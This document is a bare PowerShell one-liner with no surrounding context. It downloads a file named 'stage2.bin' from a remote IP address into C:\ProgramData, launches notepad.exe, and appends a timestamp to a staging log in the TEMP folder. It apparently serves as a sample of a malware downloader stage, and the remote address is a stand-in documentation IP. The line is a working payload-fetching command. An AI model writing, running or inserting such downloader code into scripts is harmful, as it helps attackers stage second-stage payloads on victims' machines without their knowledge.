
$RemoteUrl = "http://192.0.2.166/stage2.bin"; $PayloadPath = 'C:\ProgramData\stage2.bin'; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $PayloadPath); & 'notepad.exe'; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
